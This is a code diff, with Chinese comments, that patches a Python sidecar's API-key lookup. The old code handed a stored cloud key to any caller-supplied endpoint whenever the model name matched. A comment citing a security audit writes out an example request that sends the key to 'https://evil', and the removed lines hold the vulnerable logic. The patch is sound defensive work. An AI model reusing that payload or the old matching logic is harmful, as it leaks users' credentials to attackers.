@@ -12,23 +12,30 @@ logger = logging.getLogger("latiao-sidecar")   # 与 agent_loop 同名：日志�
 
 
 def _lookup_cloud_key(cloud_config: dict) -> str:
-    """从 config.json 的 cloud_models 按 endpoint/名称回填 API key。
+    """从 config.json 的 cloud_models 回填 API key（密钥代理化：UI 不持明文）。
 
-    前端聊天请求可不带 key（UI 不持明文），由 sidecar 持久化配置回填（密钥代理化）。
+    **只认 endpoint 逐字节一致（规范化尾斜杠后）**，不做按名称回填——2026-10-11
+    安全审计实测成立的外传通道：此前 `ep 匹配 or name 匹配` 即回填，而 endpoint
+    来自调用方请求体。构造 {"name": <已配置模型名>, "endpoint": "https://evil"}
+    就能把存量 key 发到攻击者地址（本机实测复现）。修法：地址不同一律不回填；
+    name 仅作同一地址下（同址多模型）的消歧；调用方没给 endpoint 时也不回填。
     """
     try:
         from config import CONFIG_FILE
         cfg = json.loads(CONFIG_FILE.read_text("utf-8"))
         models = cfg.get("cloud_models") or []
         ep = (cloud_config.get("endpoint") or "").rstrip("/")
+        if not ep:
+            return ""
         name = cloud_config.get("name") or cloud_config.get("model") or ""
         for m in models:
             if not isinstance(m, dict):
                 continue
-            if ep and (m.get("endpoint") or "").rstrip("/") == ep:
-                return str(m.get("key") or "")
-            if name and (m.get("name") == name or m.get("model") == name):
-                return str(m.get("key") or "")
+            if (m.get("endpoint") or "").rstrip("/") != ep:
+                continue                      # 地址不同 → 绝不回填
+            if name and m.get("name") != name and m.get("model") != name:
+                continue                      # 同址多模型：名称对不上继续找
+            return str(m.get("key") or "")
     except Exception:
         logger.debug("cloud key lookup failed", exc_info=True)
     return ""
